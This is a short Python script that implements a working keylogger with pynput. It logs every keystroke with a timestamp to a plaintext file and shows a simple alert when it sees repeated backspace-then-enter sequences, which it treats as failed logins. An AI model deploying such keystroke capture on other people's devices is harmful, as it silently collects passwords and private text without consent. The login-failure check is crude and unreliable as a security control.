from pynput.keyboard import Key, Listener
from datetime import datetime
import tkinter as tk
from tkinter import messagebox

class Keylogger:
    def __init__(self):
        self.log_file = "keylog.txt"  # Define the log file path
        self.logged_keystrokes = []
        self.root = tk.Tk()
        self.root.title("Keylogger")

    def on_press(self, key):
        try:
            self.logged_keystrokes.append((datetime.now(), str(key)))
        except Exception as e:
            print(f"Error: {e}")

    def on_release(self, key):
        if key == Key.esc:
            self.save_to_file()  # Save logged keystrokes to file
            self.analyze_keystrokes()
            self.root.destroy()
            return False

    def analyze_keystrokes(self):
        suspicious_activity = False
        keystrokes = [str(keystroke) for _, keystroke in self.logged_keystrokes]

        # Check for repeated login failures
        login_attempts = "".join(keystrokes).split("Key.enter")
        consecutive_failures = sum("Key.backspaceKey.enter" in login_attempt for login_attempt in login_attempts)
        if consecutive_failures > 2:
            suspicious_activity = True

        if suspicious_activity:
            self.generate_alert()

    def generate_alert(self):
        # Generate alert using GUI notification
        messagebox.showwarning("Alert", "Suspicious login attempt detected!")

    def save_to_file(self):
        with open(self.log_file, "a") as f:
            for timestamp, keystroke in self.logged_keystrokes:
                f.write(f"{timestamp}: {keystroke}\n")

    def start_keylogger(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start_keylogger()
